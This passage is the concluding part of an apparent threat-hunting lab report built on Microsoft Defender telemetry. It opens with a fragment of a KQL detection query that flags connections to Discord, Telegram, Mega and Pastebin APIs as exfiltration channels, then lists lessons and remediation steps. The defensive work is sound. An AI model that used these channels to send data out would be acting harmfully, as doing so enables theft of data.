| where RemoteUrl has_any ("discord", "telegram", "mega", "pastebin")
| where RemoteUrl has "api"
| project Timestamp, DeviceName, RemoteUrl, InitiatingProcessFileName
```

---

## 💡 KEY LESSONS LEARNED

### Attack Sophistication

1. **Living Off The Land** - Used only legitimate Windows tools
2. **Multi-Layered Defense Evasion** - File exclusions, path exclusions, hidden directories
3. **Automation** - [wupdate.ps](http://wupdate.ps)1 orchestrated entire attack
4. **Redundancy** - Multiple C2 servers, backup accounts, alternate exfil channels
5. **Professional Infrastructure** - Dedicated C2 servers, automated workflows

### Detection Gaps

1. **Legitimate Tool Abuse** - Hard to distinguish malicious from normal admin activity
2. **HTTPS Encryption** - C2 traffic hidden in normal web traffic
3. **Cloud Services** - Discord/Telegram exfiltration blends with legitimate use
4. **Rapid Execution** - Attack completed in ~2 hours

### What Worked

1. **EDR Telemetry** - Defender for Endpoint preserved evidence despite log clearing
2. **Process Monitoring** - Command line logging captured attack details
3. **Network Visibility** - NetFlow data revealed C2 and exfiltration
4. **KQL Hunting** - Advanced queries reconstructed full attack chain

---

## 🛡️ RECOMMENDATIONS

### Immediate Actions

1. **Isolate Systems** - Quarantine AZUKI-SL and 10.1.0.188
2. **Reset Credentials** - Force password resets for all admin accounts
3. **Remove Backdoors** - Delete support and SysUpdate accounts
4. **Block IPs** - Add all attacker IPs to firewall deny list
5. **Revoke Sessions** - Kill all active RDP sessions

### Short-Term (1-7 Days)

1. **Enable MFA** - Multi-factor authentication for all remote access
2. **Patch Systems** - Update all systems to latest security patches
3. **Review Logs** - Check for similar activity on other systems
4. **Deploy Honeytokens** - Place fake credentials to detect further access
5. **Strengthen Monitoring** - Add detections for techniques observed

### Long-Term (1-3 Months)

1. **Privileged Access Management** - Implement PAM solution
2. **Network Segmentation** - Isolate sensitive systems
3. **SSL/TLS Inspection** - Deploy to detect encrypted C2
4. **Application Whitelisting** - Prevent unauthorized tool execution
5. **Security Awareness** - Train staff on social engineering
6. **Incident Response Plan** - Update based on lessons learned
7. **Threat Hunting Program** - Proactive hunting for threats
8. **Zero Trust Architecture** - Never trust, always verify

---

## 📄 INVESTIGATION METADATA

**Tools Used:**

- Microsoft Defender for Endpoint
- Kusto Query Language (KQL)
- Advanced Hunting

**Data Sources:**

- DeviceLogonEvents
- DeviceProcessEvents
- DeviceFileEvents
- DeviceRegistryEvents
- DeviceNetworkEvents

**Investigation Duration:** ~4 hours

**Flags Captured:** 20/20 (100%)

**Report Status:** FINAL - Ready for GitHub Portfolio

---

## 🙏 ACKNOWLEDGMENTS

This investigation was completed as part of advanced threat hunting training using Microsoft Defender for Endpoint. All 20 flags were successfully captured through systematic analysis and KQL query development.

**Skills Demonstrated:**

- Advanced threat hunting
- KQL query development
- MITRE ATT&CK framework mapping
- Digital forensics
- Incident response
- Malware analysis
- Network security analysis
- Report writing

---

**Report Prepared By:** Young Achuka

**Date:** November 24, 2025

**Classification:** CONFIDENTIAL - For Portfolio Use

---

*This investigation demonstrates advanced cybersecurity analysis capabilities including threat hunting, digital forensics, and incident response. The methodology and findings showcase professional-level skills in identifying, analyzing, and documenting sophisticated cyberattacks.*
